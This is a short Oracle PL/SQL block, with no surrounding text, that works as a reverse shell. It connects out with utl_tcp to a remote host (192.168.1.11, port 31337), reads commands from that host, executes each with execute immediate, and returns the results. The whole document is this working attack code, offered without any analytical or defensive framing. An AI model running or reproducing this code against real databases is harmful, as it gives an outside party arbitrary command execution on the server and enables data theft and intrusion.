DECLARE
  data varchar2(32767);
  v_ret varchar2(32767);
  len number;
  conn utl_tcp.connection;
BEGIN
  conn := utl_tcp.open_connection(remote_host => '192.168.1.11', remote_port => 31337, charset => 'US7ASCII');

  loop
    data := utl_tcp.get_line(conn);
    data := substr(data, 1, length(data)-1);

    if lower(data) = 'exit' then
      exit;
    else
      begin
        execute immediate data into v_ret;
        len := utl_tcp.write_line(conn, 'RET:' || v_ret);
      exception
        when others then
          len := utl_tcp.write_line(conn, 'ERROR: ' || sqlcode || ' - ' || sqlerrm);
      end;
    end if;

    dbms_output.put_line('"' || data || '"');
  end loop;

  utl_tcp.close_connection(conn);
END;
